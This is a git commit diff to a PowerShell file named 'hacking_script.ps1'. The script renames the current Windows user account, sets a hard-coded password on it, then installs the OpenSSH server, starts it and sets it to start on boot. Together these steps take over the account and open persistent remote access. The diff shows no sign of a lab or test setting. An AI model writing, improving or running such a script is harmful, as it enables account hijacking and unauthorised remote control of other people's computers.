b8e250eb1c036a4a00eff1a8d0d10595446222f4
ABX532 <a.bplayzzz532@gmail.com>
2026-07-04 15:19:20 +0100

    Update hacking_script.ps1

--- hacking_script.ps1
+++ hacking_script.ps1
@@ -1,22 +1,25 @@
 $log = "C:\Users\Public\log.txt"
 
+$newName = "ABX_3amk"
+
 try {
     $currentUser = $env:USERNAME
-    Rename-LocalUser -Name $currentUser -NewName "user"
-    Add-Content $log "Renamed $currentUser to user"
+    Rename-LocalUser -Name $currentUser -NewName $newName
+    Add-Content $log "Renamed $currentUser to $newName"
 } catch {
     Add-Content $log "RENAME FAILED: $_"
 }
 
-try {
-    net user remoteuser up8sWt2KB
+net user $newName up8sWt2KB
+if ($LASTEXITCODE -ne 0) {
+    Add-Content $log "PASSWORD FAILED: exit code $LASTEXITCODE"
+} else {
     Add-Content $log "Password changed"
-} catch {
-    Add-Content $log "PASSWORD FAILED: $_"
 }
 
 try {
     Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+    Start-Sleep -Seconds 5
     Start-Service sshd
     Set-Service -Name sshd -StartupType 'Automatic'
     Add-Content $log "SSH installed and running"
